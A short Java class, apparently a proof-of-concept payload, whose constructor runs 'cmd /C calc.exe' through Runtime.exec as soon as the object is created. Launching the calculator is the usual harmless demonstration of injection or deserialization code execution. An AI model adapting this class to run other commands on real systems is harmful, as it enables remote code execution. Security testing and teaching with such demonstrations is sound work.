public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"cmd", "/C", "calc.exe"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}